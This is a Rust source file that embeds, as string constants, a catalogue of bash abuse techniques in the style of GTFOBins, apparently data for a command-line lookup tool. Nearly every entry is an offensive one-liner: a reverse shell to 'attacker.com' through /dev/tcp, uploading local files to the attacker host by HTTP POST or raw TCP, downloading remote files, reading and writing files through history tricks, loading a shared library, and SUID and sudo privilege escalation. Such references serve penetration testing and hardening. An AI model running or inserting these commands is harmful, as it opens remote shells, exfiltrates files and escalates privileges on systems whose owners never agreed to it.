pub static BIN_NAME: &'static str = "bash";
pub static SH_CODE: &'static str = r#"
    
    bash
"#;
pub static RS_DESC: &'static str = "Run `nc -l -p 12345` on the attacker box to receive the shell.";
pub static RS_CODE: &'static str = r#"
    
    export RHOST=attacker.com
    export RPORT=12345
    bash -c 'exec bash -i &>/dev/tcp/$RHOST/$RPORT <&1'
"#;
pub static FU_DESC_1: &'static str = "Send local file in the body of an HTTP POST request. Run an HTTP service on the attacker box to collect the file.";
pub static FU_CODE_1: &'static str = r#"
    
    export RHOST=attacker.com
    export RPORT=12345
    export LFILE=file_to_send
    bash -c 'echo -e "POST / HTTP/0.9\n\n$(<$LFILE)" > /dev/tcp/$RHOST/$RPORT'
"#;
pub static FU_DESC_2: &'static str = "Send local file using a TCP connection. Run `nc -l -p 12345 > 'file_to_save'` on the attacker box to collect the file.";
pub static FU_CODE_2: &'static str = r#"
    
    export RHOST=attacker.com
    export RPORT=12345
    export LFILE=file_to_send
    bash -c 'cat $LFILE > /dev/tcp/$RHOST/$RPORT'
"#;
pub static FD_DESC_1: &'static str = "Fetch a remote file via a HTTP GET request.";
pub static FD_CODE_1: &'static str = r#"
    
    export RHOST=attacker.com
    export RPORT=12345
    export LFILE=file_to_get
    bash -c '{ echo -ne "GET /$LFILE HTTP/1.0\r\nhost: $RHOST\r\n\r\n" 1>&3; cat 0<&3; } \
        3<>/dev/tcp/$RHOST/$RPORT \
        | { while read -r; do [ "$REPLY" = "$(echo -ne "\r")" ] && break; done; cat; } > $LFILE'
"#;
pub static FD_DESC_2: &'static str = "Fetch remote file using a TCP connection. Run `nc -l -p 12345 < 'file_to_send'` on the attacker box to send the file.";
pub static FD_CODE_2: &'static str = r#"
    
    export RHOST=attacker.com
    export RPORT=12345
    export LFILE=file_to_get
    bash -c 'cat < /dev/tcp/$RHOST/$RPORT > $LFILE'
"#;
pub static FW_CODE_1: &'static str = r#"
    
    export LFILE=file_to_write
    bash -c 'echo DATA > $LFILE'
"#;
pub static FW_DESC_2: &'static str = "This adds timestamps to the output file.";
pub static FW_CODE_2: &'static str = r#"
    
    LFILE=file_to_write
    HISTIGNORE='history *'
    history -c
    DATA
    history -w $LFILE
"#;
pub static FR_DESC_1: &'static str = "It trims trailing newlines and it's not binary-safe.";
pub static FR_CODE_1: &'static str = r#"
    
    export LFILE=file_to_read
    bash -c 'echo "$(<$LFILE)"'
"#;
pub static FR_DESC_2: &'static str =
    "The read file content is surrounded by the current history content.";
pub static FR_CODE_2: &'static str = r#"
    
    LFILE=file_to_read
    HISTTIMEFORMAT=$'\r\e[K'
    history -r $LFILE
    history
"#;
pub static LL_CODE: &'static str = r#"
    
    bash -c 'enable -f ./lib.so x'
"#;
pub static SUID_CODE: &'static str = r#"
    
    sudo install -m =xs $(which bash) .

    ./bash -p
"#;
pub static SUDO_CODE: &'static str = r#"
    
    sudo bash
"#;
use crate::code::{Code, Tag};
pub static SH: Code<'static> = Code {
    title: "SH_CODE",
    code: SH_CODE,
    tag: Tag::SH,
};
pub static RS: Code<'static> = Code {
    title: "RS_CODE",
    code: RS_CODE,
    tag: Tag::RS,
};
pub static FU_1: Code<'static> = Code {
    title: "FU_CODE_1",
    code: FU_CODE_1,
    tag: Tag::FU,
};
pub static FU_2: Code<'static> = Code {
    title: "FU_CODE_2",
    code: FU_CODE_2,
    tag: Tag::FU,
};
pub static FD_1: Code<'static> = Code {
    title: "FD_CODE_1",
    code: FD_CODE_1,
    tag: Tag::FD,
};
pub static FD_2: Code<'static> = Code {
    title: "FD_CODE_2",
    code: FD_CODE_2,
    tag: Tag::FD,
};
pub static FW_1: Code<'static> = Code {
    title: "FW_CODE_1",
    code: FW_CODE_1,
    tag: Tag::FW,
};
pub static FW_2: Code<'static> = Code {
    title: "FW_CODE_2",
    code: FW_CODE_2,
    tag: Tag::FW,
};
pub static FR_1: Code<'static> = Code {
    title: "FR_CODE_1",
    code: FR_CODE_1,
    tag: Tag::FR,
};
pub static FR_2: Code<'static> = Code {
    title: "FR_CODE_2",
    code: FR_CODE_2,
    tag: Tag::FR,
};
pub static LL: Code<'static> = Code {
    title: "LL_CODE",
    code: LL_CODE,
    tag: Tag::LL,
};
pub static SUID: Code<'static> = Code {
    title: "SUID_CODE",
    code: SUID_CODE,
    tag: Tag::SUID,
};
pub static SUDO: Code<'static> = Code {
    title: "SUDO_CODE",
    code: SUDO_CODE,
    tag: Tag::SUDO,
};
